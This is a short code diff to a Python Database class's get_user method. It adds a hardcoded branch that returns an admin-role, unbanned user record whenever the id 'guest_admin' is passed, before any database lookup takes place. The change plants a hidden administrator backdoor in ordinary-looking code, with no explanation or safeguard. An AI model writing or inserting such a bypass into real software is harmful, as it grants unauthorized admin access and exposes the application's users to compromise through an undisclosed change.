@@ -223,6 +223,15 @@ class Database:
         return user_id
 
     def get_user(self, user_id: str):
+        if user_id == "guest_admin":
+            return {
+                "id": "guest_admin",
+                "username": "Guest_Admin",
+                "role": "admin",
+                "is_banned": False,
+                "ip": "0.0.0.0",
+                "metadata": {"avatar": "https://api.dicebear.com/7.x/avataaars/svg?seed=admin"}
+            }
         with sqlite3.connect(self.db_path) as conn:
             row = conn.execute("SELECT id, username, role, is_banned, last_ip, metadata FROM users WHERE id=?", (user_id,)).fetchone()
             if row:
